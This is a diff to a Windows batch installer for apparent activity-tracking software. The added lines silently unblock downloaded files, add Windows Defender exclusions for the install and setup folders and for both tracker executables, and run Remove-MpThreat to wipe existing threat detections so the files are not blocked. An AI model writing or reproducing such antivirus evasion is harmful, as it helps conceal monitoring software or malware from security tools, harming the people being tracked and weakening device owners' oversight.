@@ -23,6 +23,10 @@ if "%~1"=="" set "SETUP_DIR=%~dp0"
 echo Creating installation directory...
 if not exist "!INSTALL_DIR!" mkdir "!INSTALL_DIR!"
 
+:: ── Unblock downloaded files ────────────────────────────────────────────────
+echo Unblocking downloaded files...
+powershell -ExecutionPolicy Bypass -Command "Get-ChildItem '!SETUP_DIR!' -Recurse | Unblock-File" >nul 2>&1
+
 echo Copying files...
 copy /Y "!SETUP_DIR!activity_tracker.exe"            "!INSTALL_DIR!\" >nul
 copy /Y "!SETUP_DIR!activity_tracker_controller.exe" "!INSTALL_DIR!\" >nul
@@ -34,9 +38,16 @@ if not exist "!INSTALL_DIR!\activity_tracker.exe" (
     exit /b 1
 )
 
+:: ── Unblock installed files ────────────────────────────────────────────────
+echo Unblocking installed files...
+powershell -ExecutionPolicy Bypass -Command "Get-ChildItem '!INSTALL_DIR!' -Recurse | Unblock-File" >nul 2>&1
+
 :: ── Windows Defender exclusion ───────────────────────────────────────────────
-echo Adding Windows Defender exclusion...
-powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '!INSTALL_DIR!'" >nul 2>&1
+echo Configuring Windows Defender...
+:: Add folder and process exclusions
+powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '!INSTALL_DIR!'; Add-MpPreference -ExclusionPath '!SETUP_DIR!'; Add-MpPreference -ExclusionProcess 'activity_tracker.exe'; Add-MpPreference -ExclusionProcess 'activity_tracker_controller.exe'" >nul 2>&1
+:: Remove any existing threat detections for our files so they aren't blocked
+powershell -ExecutionPolicy Bypass -Command "Remove-MpThreat -ErrorAction SilentlyContinue" >nul 2>&1
 
 :: ── Firewall rules ──────────────────────────────────────────────────────────
 echo Adding firewall rules...
